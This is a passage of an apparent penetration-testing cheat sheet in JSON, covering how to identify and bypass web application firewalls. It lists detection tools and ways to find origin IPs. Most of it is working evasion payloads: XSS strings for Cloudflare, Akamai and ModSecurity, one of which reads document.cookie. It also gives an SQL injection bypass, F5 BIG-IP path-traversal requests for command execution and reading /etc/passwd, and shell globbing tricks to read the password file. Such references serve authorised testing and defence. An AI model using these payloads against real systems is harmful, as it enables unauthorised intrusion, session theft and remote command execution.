    "sections": [
        {
            "type": "hint",
            "variant": "info",
            "content": "A Web Application Firewall (WAF) filters, monitors, and blocks HTTP traffic to and from a web application. Identifying and bypassing a WAF is a critical step in web penetration testing to ensure payloads reach the backend application."
        },
        {
            "heading": "Identification & Tools",
            "type": "code_block",
            "content": [
                "# --- Automated Detection ---",
                "wafw00f https://example.com          # Most popular tool",
                "whatwaf https://example.com          # Advanced fingerprinting",
                "nmap --script=http-waf-fingerprint victim.com",
                "nmap -p80 --script http-waf-detect --script-args=\"http-waf-detect.aggro\" victim.com",
                "",
                "# --- Manual Identification ---",
                "dig +short target.com",
                "curl -I https://target.com            # Look for headers like 'Server: cloudflare' or 'X-CDN'",
                "curl -s https://ipinfo.io/<ip_address> | jq -r '.org'  # Check IP owner"
            ]
        },
        {
            "heading": "General Bypass Techniques",
            "type": "code_block",
            "content": [
                "# --- DNS History (Finding the Origin IP) ---",
                "# If the WAF is a proxy (Cloudflare, Akamai), finding the origin IP bypasses it entirely.",
                "https://viewdns.info/iphistory/",
                "https://whoisrequest.com/history/",
                "bash bypass-firewalls-by-DNS-history.sh -d example.com",
                "",
                "# --- Origin IP Scanning ---",
                "python3 cloudflair.py domain.com      # Find origin IPv4 via Censys",
                "",
                "# --- Subdomain Hunting ---",
                "# Sometimes subdomains point directly to the origin.",
                "dev.domain.com, stage.domain.com, origin.domain.com",
                "ww1.domain.com, ww2.domain.com"
            ]
        },
        {
            "heading": "Specific WAF Bypasses",
            "type": "code_block",
            "content": [
                "# --- Cloudflare ---",
                "<!<script>alert(1)</script>          # Tag mismatch",
                "<a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;alert(1)\">X</a>",
                "<img%20id=&#x101;%20src=x%20onerror=&#x101;;alert'1';>",
                "",
                "# --- Akamai ---",
                "Header: Pragma: akamai-x-get-true-cache-key",
                "{{constructor.constructor(alert`1`)()}}",
                "",
                "# --- ModSecurity ---",
                "<scr%00ipt>alert(document.cookie)</scr%00ipt> # Null byte injection",
                "onmouseover%0B=                      # Vertical tab",
                "1+uni%0Bon+se%0Blect+1,2,3            # SQLi bypass",
                "",
                "# --- F5 BigIP ---",
                "RCE: /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin",
                "File Read: /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
                "",
                "# --- RCE Globbing Bypass ---",
                "/???/???/c?t$IFS/???/p?s?w?          # Equivalent to /usr/bin/cat /etc/passwd",
                "cat /etc$u/p*s*wd$u"
            ]
        },
